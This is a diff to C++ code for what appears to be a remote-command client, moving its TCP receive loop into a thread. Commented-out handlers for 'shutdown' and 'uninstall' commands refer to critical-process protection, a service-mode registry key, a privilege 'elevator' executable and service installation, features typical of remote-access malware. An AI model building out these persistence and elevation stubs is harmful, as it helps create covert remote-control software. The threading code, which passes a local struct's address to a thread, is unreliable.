@@ -18,8 +18,20 @@ void Server::sendTCP(std::string buf)
     timeout_counter = 0;
 }
 
+//Start the real thread for receiving
 int Server::receive(PARSER p)
 {
+    PARSESTRUCT STRCT;
+    STRCT.p = p;
+    STRCT.s = this;
+    int rc = pthread_create(&receiveTCPThreads[0], NULL, &Server::waitForRecvFunc, &STRCT);
+    if (rc) {
+        std::cout<<"THREAD CREATION FAILED\n";
+    }
+    return rc;
+}
+
+int Server::receive_low(PARSER p) {
     char recvbuf[DEFAULT_BUFLEN];
     memset(recvbuf, '\0', sizeof(recvbuf));
     if (timeout_counter >= 10)
@@ -57,7 +69,7 @@ int Server::receive(PARSER p)
             iResult2 = e;
             std::string temp_str = "";
             //if (encryptOn) temp_str = encrypt(recvbuf);
-            /*else*/ temp_str = recvbuf;
+            temp_str = recvbuf; //else
 
             //std::cout << "TEMPSTR: " << temp_str << "\n";
 
@@ -78,7 +90,7 @@ int Server::receive(PARSER p)
                     {
                         ret = p(*this, temp_str.substr(0, temp_str.find("<EOF>")));
                         temp_str = "";
-                        cont = false;
+                        cont = false; //Maybe not necessary?
                     }
 
                     loopcount++;
@@ -111,62 +123,42 @@ int Server::receive(PARSER p)
 
 //Thread created to loop for receiving data.
 //recvfunc() actually loops, this just starts that loop and receives its output
-void *Server::waitForRecvfunc(void (*v)()) {
-    int exit_code = this.recvfunc(v);
+void *Server::waitForRecvFunc(void * v) {
+    PARSESTRUCT *p = static_cast<PARSESTRUCT*>(v);
 
-    if (exit_code == 2) {	//if the 'shutdown' command is received
-        //exit(0); //TODO: THIS IS DIRTY
-		//return 2;
-	}
-    if (exit_code == 3) {
+    while (true) {
+        int exit_code = p->s->receive_low(p->p);
+
         /*
-        if (!IsElevated()) {
-            set_process_critical(FALSE);
-        }
-        */
-	}
-	if (exit_code == 4) {	//if the 'uninstall' command was received
-		//protect_service = false; //Possibly deprecated
-		//set_process_critical(FALSE);	//remove possible process protection
-		//testPort(2); //release the testPort() mutex
-		//Sleep(6000);
-		//CreateMyService("", FALSE);	//uninstall service
-		//setRegKey(FALSE);	//remove possible registry key for servicemode
-		//remove("w7us.exe");		//remove elevator
-		//return 2;
-	}
-}
+        printf("waitForRecvFunc: ");
 
-//Called by waitForRecvfunc, loops and gets return value from Server.receive()
-int Server::recvfunc(void (*v)(Server c, std::string buffer))
-{
-    int s = 0;
-    while(true) {
-		try {		//Backup in case we crash somewhere
-			int return_val = server.receive(v);
-			if (return_val == 1) {
-				//std::cout<<"BEFORE SLEEP\n";
-				sleep(5);
-				//std::cout<<"AFTER SLEEP\n";
-				server.resetTCP();
-				s++;
-			}
-			else if (return_val == 2) {
-				return 2;
-			}
-			else if (return_val == 3) {
-				return 3;
-			}
-			else if (return_val == 4) {
-				return 4;
-			}
-		}
-		catch (int e) {		//catch for the try/catch
-			//server.send("/update_status -t PROGRAM CRASH - RESCUED -c 2");
-			std::cout<<"ERROR: "<<e<<"\n";
-		}
+        char exit_char[10];
+        itoa(exit_code, exit_char, 10);
+        printf("%s", exit_char);
+        printf("\n");
+        */
+        if (exit_code == 2) {	//if the 'shutdown' command is received
+            //exit(0); //TODO: THIS IS DIRTY
+            //return 2;
+        }
+        if (exit_code == 3) {
+            /*
+            if (!IsElevated()) {
+                set_process_critical(FALSE);
+            }
+            */
+        }
+        if (exit_code == 4) {	//if the 'uninstall' command was received
+            //protect_service = false; //Possibly deprecated
+            //set_process_critical(FALSE);	//remove possible process protection
+            //testPort(2); //release the testPort() mutex
+            //Sleep(6000);
+            //CreateMyService("", FALSE);	//uninstall service
+            //setRegKey(FALSE);	//remove possible registry key for servicemode
+            //remove("w7us.exe");		//remove elevator
+            //return 2;
+        }   
     }
-    return 0;
 }
 
 int Server::connectTCP(std::string hostname, std::string port)
@@ -280,7 +272,7 @@ void Server::receiveUDPThread() {
     std::cout<<"UDP RETURNED\n";
 }
 
-static void *Server::receiveUDPThreadHelper(void *context)
+void *Server::receiveUDPThreadHelper(void *context)
 {
     ((Server *)context)->receiveUDPThread();
 }
